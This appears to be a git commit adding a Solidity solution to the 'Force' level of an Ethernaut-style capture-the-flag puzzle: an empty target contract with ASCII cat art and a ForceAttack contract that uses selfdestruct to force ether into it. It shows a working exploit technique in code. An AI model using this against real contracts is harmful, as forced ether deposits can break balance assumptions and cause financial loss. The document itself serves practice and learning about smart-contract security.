39d64e5e8e1317a33113fe73bc4b887e054fd35f
Manikanta Nynala <90610801+manikantanynala97@users.noreply.github.com>
2023-01-10 17:22:39 +0530

    Create 07-Force.sol

---
+++ 07-Force.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+
+contract ForceAttack
+{
+
+    function attack(address payable _to) external payable
+    {
+        selfdestruct(_to);
+    }
+}
